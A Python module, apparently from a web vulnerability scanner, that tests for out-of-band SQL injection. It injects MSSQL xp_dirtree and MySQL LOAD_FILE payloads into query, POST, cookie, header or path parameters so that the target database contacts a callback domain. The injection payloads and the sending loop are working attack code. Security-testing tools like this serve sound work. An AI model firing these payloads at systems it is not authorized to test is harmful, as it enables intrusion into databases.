import uuid
import urllib.parse
from ..utils import send_request

# Out-of-band SQL injection detection
# This module triggers DNS/HTTP requests to a callback domain. The
# user must monitor the callback domain for interactions to confirm
# exploitation.

PAYLOADS = [
    "'; EXEC master..xp_dirtree '//{domain}/{token}';-- ",
    "'; SELECT LOAD_FILE('\\\\{domain}\\{token}');-- ",
]


def test_parameter(
    url: str,
    param: str,
    value: str,
    callback_domain: str = "example.com",
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    headers: dict | None = None,
    location: str = "query",
    path_index: int | None = None,
):
    """Attempt OOB SQL injection on a parameter.

    Because verification requires an external listener, this function
    does not automatically confirm vulnerability. Instead it returns a
    token per payload that can be monitored externally.
    """
    data = data or {}
    cookies = cookies or {}
    headers = headers or {}
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if location == "cookie":
        original = cookies.get(param, "")
    elif location == "header":
        original = headers.get(param, "")
    elif location == "path" and path_index is not None:
        segments = parsed.path.split("/")
        original = segments[path_index]
    elif method.lower() == "get":
        original = query.get(param, [''])[0]
    else:
        original = data.get(param, "")

    results = []
    for template in PAYLOADS:
        token = uuid.uuid4().hex
        payload = template.format(domain=callback_domain, token=token)
        if location == "cookie":
            new_cookies = cookies.copy()
            new_cookies[param] = original + payload
            new_url = url
            try:
                send_request(new_url, method=method, data=data if method.lower() == "post" else None, cookies=new_cookies, headers=headers)
            except Exception:
                pass
        elif location == "header":
            new_headers = headers.copy()
            new_headers[param] = original + payload
            new_url = url
            try:
                send_request(new_url, method=method, data=data if method.lower() == "post" else None, cookies=cookies, headers=new_headers)
            except Exception:
                pass
        elif location == "path" and path_index is not None:
            segments = parsed.path.split("/")
            segments[path_index] = original + payload
            new_path = "/".join(segments)
            new_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
            try:
                send_request(new_url, method=method, data=data if method.lower() == "post" else None, cookies=cookies, headers=headers)
            except Exception:
                pass
        elif method.lower() == "get":
            query[param] = original + payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            try:
                send_request(new_url, cookies=cookies, headers=headers)
            except Exception:
                pass
        else:
            post_data = data.copy()
            post_data[param] = original + payload
            new_url = url
            try:
                send_request(new_url, method="post", data=post_data, cookies=cookies, headers=headers)
            except Exception:
                pass
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'token': token,
            # Vulnerability must be confirmed via callback monitoring
            'vulnerable': False,
        })
    return results

